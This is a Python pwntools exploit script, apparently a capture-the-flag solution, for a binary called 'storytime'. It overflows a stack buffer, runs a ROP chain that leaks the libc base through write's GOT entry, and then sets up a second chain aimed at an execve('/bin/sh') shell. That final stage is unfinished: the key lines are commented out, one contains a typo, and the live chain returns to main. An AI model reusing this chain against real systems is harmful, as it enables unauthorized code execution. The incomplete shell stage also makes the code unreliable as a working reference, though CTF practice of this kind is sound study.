from pwn import *

elf = ELF("./storytime")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"

address = {}
address["pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"] = p64(0x4006fc)
address["pop rdi ; ret"] = p64(0x400703)
address["pop rsi ; pop r15 ; ret"] = p64(0x400701)
address["write of got"] = p64(elf.got["write"])
address["write of plt"] = p64(elf.symbols["write"])
address["end"] = p64(elf.symbols["end"])
address["climax"] = p64(elf.symbols["climax"])

offset = {}
offset["write"] = libc.symbols["write"]
offset["execve('/bin/sh', r12, r13)"] = 0xcbd1a
offset["pop r12 ; pop r13 ; ret"] = 0x28487


def leak_base_libc(target):
  bof_size_of_main = 0x38
  payload = b"0" * bof_size_of_main
  payload += address["end"]
  # payload += p64(0x0)
  payload += address["pop rsi ; pop r15 ; ret"]
  payload += address["write of got"]
  payload += p64(0x0)
  payload += address["write of plt"]
  # payload += p64(0x0)
  payload += address["climax"]
  target.recvuntil(b"Tell me a story: \n")
  target.sendline(payload)
  target.recvuntil(b"The End!\n")
  leak_address = u64(target.recv(8))
  address["libc"] = leak_address - offset["write"]
  log.info("libc base address: "+hex(address["libc"]))


def exec_shell(target):
  bof_size_of_climax = 0x38
  payload = b"0" * bof_size_of_climax
  payload += address["pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"]
  for _ in range(4):
    payload += p64(0x0)
  payload += p64(address["libc"] + offset["pop r12 ; pop r13 ; ret"])
  # for _ in range(2):
  #   payload += p64(0x0)
  # payload += p64(add/ress["libc"] + offset["execve('/bin/sh', r12, r13)"])
  payload += p64(elf.symbols["main"])
  target.sendline(payload)


def main():
  target = process("./storytime")
  leak_base_libc(target)
  exec_shell(target)
  target.interactive()


if __name__ == "__main__":
  main()
